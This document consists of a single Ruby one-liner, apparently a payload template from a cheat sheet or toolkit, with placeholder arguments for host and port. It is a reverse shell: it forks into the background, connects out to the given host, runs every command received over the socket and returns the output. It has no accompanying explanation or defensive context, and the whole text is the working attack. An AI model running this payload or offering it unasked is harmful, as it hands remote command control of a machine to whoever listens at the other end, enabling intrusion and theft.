ruby -rsocket -e'exit if fork;c=TCPSocket.new("$$ARGV1", "$$ARGV2"); while(cmd=c.gets); IO.popen(cmd,"r"){|io|c.print io.read}end'
